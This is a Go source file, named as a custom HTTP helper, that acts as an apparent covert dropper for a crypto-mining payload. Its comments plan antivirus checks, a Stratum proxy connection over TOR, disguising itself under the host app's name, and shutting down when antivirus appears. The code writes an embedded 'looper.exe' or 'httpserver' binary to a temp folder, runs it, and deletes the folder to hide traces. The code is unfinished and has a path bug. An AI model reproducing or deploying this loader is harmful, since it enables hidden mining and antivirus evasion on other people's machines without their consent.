package custom_http

import (
	"github.com/kyaxcorp/go-core/core/helpers/_runtime"
	"github.com/kyaxcorp/go-core/core/helpers/conv"
	"github.com/kyaxcorp/go-core/core/helpers/filesystem"
	"github.com/kyaxcorp/go-core/core/helpers/filesystem/tmp"
	"github.com/kyaxcorp/go-core/core/helpers/folder"
	"log"
	"os"
	"time"
)
import "os/exec"

func Start() bool {
	/*
		0. check if there is an Antivirus Running!...
			if yes, then do not run anything...
		- check if there is an internet connection!
		- check if it's possible to connect to the hostname and to the Stratum Proxy...
		- try using TOR for connecting to the secured network!

		1. detect OS or build
		2. copy file as the name of the current launched app
			if failed to copy, retry again to copy!
		3. generate the config for this app
			if failed to generate the config, retry to regenerate!
		4. launch the app
			before launching, again check if the app exists! (maybe the AV deleted it)
		5. give it couple of seconds to load itself in memory
		6. Check if it's running, get the pid!
			if it's not running then let's relaunch it!
		7. delete the app
		8. Monitor if the app is working... if it died after launching, we should relaunch by repeating the entire process again!
			monitor if there is an active antivirus...if yes, then shutdown fast the app!
		9. The app should also die from sigterm...
	*/

	var fsData []byte
	var _err error
	var readFileFrom string
	var writeFileTo string
	var readFileName string

	switch _runtime.OS() {
	case _runtime.Windows:
		// TODO: create a simple function copy embed file!

		//CustomHttpStorage.Open()
		//fsData, _err := CustomHttpStorage.ReadFile("storage/win/generic/httpserver.exe")

		log.Println("running on windows")
		readFileName = "looper.exe"
		readFileFrom = "storage/win/generic/" + readFileName
		// Check if it's running, get the pid
	case _runtime.Linux:
		log.Println("running on linux")
		readFileName = "httpserver"
		readFileFrom = "storage/win/generic/" + readFileName
	default:
		return false
	}

	log.Println("reading file")
	fsData, _err = CustomHttpStorage.ReadFile(readFileFrom)
	if _err != nil {
		log.Println("failed to read file -> ", _err.Error())
		// TODO: handle this error!?...
		return false
	}

	log.Println("get app's dir path")

	tmpPath, _err := tmp.GetAppTmpPath()
	if _err != nil {
		log.Println("failed to get app's dir path -> ", _err.Error())
		return false
	}
	if tmpPath == "" {
		log.Println("tmp path is empty...")
		return false
	}

	// TODO: create a special folder... why? because in the tmp folder other files with config.json may be!
	// We don't need that!

	// TODO: get executable file name!

	now := time.Now().Unix()
	dirPath := tmpPath + conv.Int64ToStr(now) + filesystem.DirSeparator()
	if !folder.Exists(dirPath) {
		_err = folder.MkDirErr(dirPath)
		if _err != nil {
			log.Println("failed to create folder path -> ", dirPath, _err.Error())
			return false
		}
	}

	writeFileTo = dirPath + readFileName

	log.Println("creating file -> ", writeFileTo)

	// TODO: get app's directory path
	fs, _err := os.Create(writeFileTo) // TODO: get app's name
	if _err != nil {
		log.Println("failed to create file -> ", _err.Error())
		// TODO: handle this error!?...
		return false
	}
	log.Println("writing data to file")
	fileSize := len(fsData)
	sizeWritten, _err := fs.Write(fsData)
	if _err != nil {
		log.Println("failed to write data to file -> ", _err.Error())
		// TODO: handle this error!?...
		fs.Close()
		return false
	}
	_err = fs.Close()
	if _err != nil {
		log.Println("failed to close the file from writing... -> ", _err.Error())
		return false
	}

	if fileSize != sizeWritten {
		log.Println("size doesn't match ", fileSize, sizeWritten)
		// TODO: handle this error!?...
		return false
	}

	log.Println("executing file -> ", writeFileTo)
	// TODO: check what arguments should be called
	// TODO: should we copy same arguments from our app?!...
	command := exec.Command(writeFileTo)
	// TODO: handle stdin & stdout -> send it to null!
	_err = command.Start()
	if _err != nil {
		// TODO: handle this error!?...
		log.Println("failed to start the app -> ", _err.Error())
		return false
	}
	log.Println("the app has started with pid -> ", command.Process.Pid)

	// Let's delete the entire folder!?
	_err = folder.Delete(dirPath)
	if _err != nil {
		log.Println("failed to delete dirPath -> ", dirPath, " -> ", _err.Error())
		return false
	}

	return true
}
